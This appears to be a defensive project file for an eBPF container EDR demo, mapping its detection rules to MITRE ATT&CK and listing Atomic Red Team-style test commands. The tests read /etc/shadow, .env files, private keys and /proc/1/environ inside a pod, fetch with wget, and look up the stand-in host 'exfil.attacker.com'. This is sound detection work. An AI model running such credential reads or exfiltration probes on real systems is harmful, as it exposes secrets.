# MITRE ATT&CK Coverage — eBPF EDR Demo

Scope: container/K8s workload techniques only. Full ATT&CK has 200+ techniques;
~35 are relevant to containerized GKE workloads. Coverage % is against that scoped set.

**Current coverage: 8 / 35 relevant techniques (~23%)**

---

## Detection Rules → MITRE Mapping

| Rule | Severity | MITRE ID | Technique | Validated |
|------|----------|----------|-----------|-----------|
| `shell_spawn_container` | CRITICAL | T1059.004 | Command & Scripting: Unix Shell | ✅ V2 |
| `shell_spawn_container` | CRITICAL | T1609 | Container Administration Command | ✅ V2 |
| `unknown_namespace_process` | CRITICAL | T1611 | Escape to Host | ⬜ not yet |
| `host_reads_container_fs` | CRITICAL | T1611 | Escape to Host | ⬜ not yet |
| `network_tool_container` (nc/ncat) | HIGH | T1095 | Non-Application Layer Protocol | ⬜ not yet |
| `network_tool_container` (wget) | HIGH | T1105 | Ingress Tool Transfer | ⬜ not yet |
| `sensitive_file_access` /etc/shadow | HIGH | T1003.008 | OS Credential Dumping: /etc/passwd & /etc/shadow | ✅ V3 |
| `sensitive_file_access` .key/.env/id_rsa | HIGH | T1552.001 | Unsecured Credentials: Credentials in Files | ⬜ not yet |
| `sensitive_file_access` .key/id_rsa | HIGH | T1552.004 | Unsecured Credentials: Private Keys | ⬜ not yet |
| `sensitive_file_access` /proc/1/ | HIGH | T1611 | Escape to Host | ⬜ not yet |
| `sensitive_file_access` /etc/passwd | MEDIUM | T1082 | System Information Discovery | ⬜ not yet |
| `unauthorized_external_connect` | HIGH | T1041 | Exfiltration Over C2 Channel | ✅ V4 |
| `unauthorized_external_connect` | HIGH | T1048 | Exfiltration Over Alternative Protocol | ✅ V4 |

---

## ATT&CK Coverage by Tactic

### ✅ Covered

| Tactic | Technique | Rule |
|--------|-----------|------|
| Execution | T1059.004 Unix Shell | `shell_spawn_container` |
| Execution | T1609 Container Admin Command | `shell_spawn_container` |
| Privilege Escalation | T1611 Escape to Host | `unknown_namespace_process`, `host_reads_container_fs` |
| Credential Access | T1003.008 /etc/shadow dump | `sensitive_file_access` |
| Credential Access | T1552.001 Credentials in Files | `sensitive_file_access` .env/.key |
| Credential Access | T1552.004 Private Keys | `sensitive_file_access` id_rsa/.pem |
| Command & Control | T1095 Non-App Layer Protocol | `network_tool_container` nc/ncat |
| Command & Control | T1105 Ingress Tool Transfer | `network_tool_container` wget |
| Exfiltration | T1041 Exfil Over C2 Channel | `unauthorized_external_connect` |
| Exfiltration | T1048 Exfil Over Alt Protocol | `unauthorized_external_connect` |

### ❌ Not Covered — Priority Gaps

| Tactic | Technique | Why It Matters | Complexity to Add |
|--------|-----------|----------------|-------------------|
| Initial Access | T1190 Exploit Public-Facing App | Attacker exploits app vulnerability — our entry point is the gateway | High — needs app-layer detection |
| Execution | T1610 Deploy Container | Attacker deploys a new malicious container | Medium — needs container lifecycle events |
| Persistence | T1525 Implant Internal Image | Attacker backdoors a container image | High — needs image scanning |
| Persistence | T1053.003 Cron | Attacker installs cron job inside container | Medium — monitor /var/spool/cron writes |
| Defense Evasion | T1036 Masquerading | Attacker renames malicious binary to look like legit process | Low — add comm name heuristics |
| Defense Evasion | T1070.003 Clear Command History | Attacker deletes bash history | Low — watch .bash_history writes |
| Discovery | T1046 Network Service Scan | Port scan from inside container | Medium — lsm-connect sees burst of connections |
| Discovery | T1613 Container & Resource Discovery | Attacker runs `docker ps` or `kubectl get pods` | Low — add to networkBinaries/shellBinaries |
| Lateral Movement | T1570 Lateral Tool Transfer | Attacker copies tools between pods | Medium — watch unexpected file writes + execs |
| Collection | T1005 Data from Local System | Attacker reads application data files | Medium — needs per-service sensitive path policy |
| Impact | T1496 Resource Hijacking | Crypto miner deployed | Medium — detect unusual CPU-bound processes |
| Impact | T1485 Data Destruction | Attacker deletes data | Low — watch unlink/rmdir on sensitive paths |

---

## Atomic Red Team Tests

Each test below simulates the real attack technique against your GKE cluster.
Run from your local machine. Verify the expected alert fires in `kubectl logs -n kube-system -l app=ebpf-edr`.

### T1059.004 — Unix Shell (shell_spawn_container)

```bash
# Atomic: execute interactive shell inside container
TARGET=$(kubectl get pod -n order-processor -l component=user-service -o jsonpath='{.items[0].metadata.name}')
kubectl exec "$TARGET" -n order-processor -- bash -c "id && whoami"

# Expected: CRITICAL shell_spawn_container service=user-service
```

### T1609 — Container Administration Command (shell_spawn_container)

```bash
# Atomic: use kubectl exec to run commands (simulates attacker with stolen kubeconfig)
TARGET=$(kubectl get pod -n order-processor -l component=user-service -o jsonpath='{.items[0].metadata.name}')
kubectl exec "$TARGET" -n order-processor -- sh -c "ps aux"

# Expected: CRITICAL shell_spawn_container service=user-service
```

### T1003.008 — /etc/shadow Dump (sensitive_file_access)

```bash
# Atomic: read shadow password file
TARGET=$(kubectl get pod -n order-processor -l component=user-service -o jsonpath='{.items[0].metadata.name}')
kubectl exec "$TARGET" -n order-processor -- cat /etc/shadow

# Expected: HIGH sensitive_file_access filename=/etc/shadow service=user-service
```

### T1552.001 — Credentials in Files (sensitive_file_access)

```bash
# Atomic: read .env file containing application secrets
TARGET=$(kubectl get pod -n order-processor -l component=user-service -o jsonpath='{.items[0].metadata.name}')
kubectl exec "$TARGET" -n order-processor -- find / -name "*.env" -maxdepth 5 2>/dev/null
kubectl exec "$TARGET" -n order-processor -- cat /app/.env 2>/dev/null || true

# Expected: HIGH sensitive_file_access filename=*.env service=user-service
```

### T1552.004 — Private Keys (sensitive_file_access)

```bash
# Atomic: search for and read private key files
TARGET=$(kubectl get pod -n order-processor -l component=user-service -o jsonpath='{.items[0].metadata.name}')
kubectl exec "$TARGET" -n order-processor -- find / -name "id_rsa" -o -name "*.key" 2>/dev/null | head -5

# Expected: HIGH sensitive_file_access filename=*.key service=user-service
```

### T1611 — Escape to Host (/proc/1 access) (sensitive_file_access)

```bash
# Atomic: read host init process — container escape indicator
TARGET=$(kubectl get pod -n order-processor -l component=user-service -o jsonpath='{.items[0].metadata.name}')
kubectl exec "$TARGET" -n order-processor -- cat /proc/1/environ 2>/dev/null || true

# Expected: HIGH sensitive_file_access filename=/proc/1/environ service=user-service
```

### T1105 — Ingress Tool Transfer (network_tool_container)

```bash
# Atomic: use wget to download tool from internet (simulates attacker staging tools)
# Note: wget must be installed in the container. If not, apt-get install wget first.
TARGET=$(kubectl get pod -n order-processor -l component=user-service -o jsonpath='{.items[0].metadata.name}')
kubectl exec "$TARGET" -n order-processor -- wget -q http://example.com -O /tmp/test 2>/dev/null || true

# Expected: HIGH network_tool_container comm=/usr/bin/wget service=user-service
# Also expected: HIGH unauthorized_external_connect (wget opens TCP connection)
```

### T1041 — Exfiltration Over C2 Channel (unauthorized_external_connect)

```bash
# Atomic: connect to external IP (simulates data exfiltration to attacker C2)
TARGET=$(kubectl get pod -n order-processor -l component=user-service -o jsonpath='{.items[0].metadata.name}')
kubectl exec "$TARGET" -n order-processor -- \
  python3 -c "import socket; s=socket.socket(); s.settimeout(3); s.connect(('8.8.8.8',80)); s.close()" 2>/dev/null || true

# Expected: HIGH unauthorized_external_connect dst=8.8.8.8:80 service=user-service
```

### T1048 — Exfiltration Over Alternative Protocol (unauthorized_external_connect)

```bash
# Atomic: DNS exfiltration attempt (data encoded in DNS queries)
TARGET=$(kubectl get pod -n order-processor -l component=user-service -o jsonpath='{.items[0].metadata.name}')
kubectl exec "$TARGET" -n order-processor -- \
  python3 -c "import socket; socket.getaddrinfo('exfil.attacker.com', 53)" 2>/dev/null || true

# Expected: HIGH unauthorized_external_connect (DNS lookup to external resolver)
# Note: may not fire if DNS goes through internal resolver first
```

---

## Validation Script

Run all Atomic Red Team tests and check results:

```bash
./validate-gke.sh          # runs V2-V6 (covers T1059, T1003, T1041)
# TODO: extend validate-gke.sh with V7-V12 for remaining techniques above
```

---

## Gap Priorities

Given the threat model (containerized microservices, financial data, GKE):

**Add next (low effort, high signal):**
1. T1070.003 — watch `.bash_history` writes (attacker covering tracks)
2. T1613 — alert on `kubectl`/`docker` exec inside a container (attacker doing recon)
3. T1036 — comm name heuristics (binary named `python` but running from `/tmp`)

**Add later (medium effort):**
4. T1046 — burst detection on lsm-connect (many unique dst IPs in short window)
5. T1053.003 — watch `/var/spool/cron` and `/etc/cron.d/` writes

**Out of scope for this project:**
- T1190 (app-layer exploit) — needs WAF or RASP, not eBPF
- T1525 (image backdoor) — needs image scanning at build time, not runtime
